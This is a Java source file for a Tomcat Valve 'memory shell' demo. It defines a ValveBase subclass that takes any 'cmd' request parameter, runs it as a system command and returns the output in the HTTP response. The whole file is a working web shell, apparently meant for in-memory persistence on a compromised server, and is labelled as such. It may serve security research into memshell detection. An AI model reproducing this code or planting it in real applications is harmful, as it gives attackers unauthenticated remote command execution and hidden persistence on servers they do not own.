package cc.saferoad.servlet.valvememshell;/*
@auther S0cke3t
@date 2021-12-29
*/

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;

public class ValveShellDemo extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        response.getWriter().println("this is a valve memshell");
        String command = request.getParameter("cmd");
        if (command != null && !command.isEmpty()) {
            PrintWriter out = response.getWriter();
            Process process = Runtime.getRuntime().exec(command);
            InputStream in = process.getInputStream();
            int a = 0;
            byte[] b = new byte[1024];
            while ((a = in.read(b)) != -1) {
                out.println(new String(b, 0, a));
            }
            in.close();
            out.flush();
            out.close();
        }
    }
}
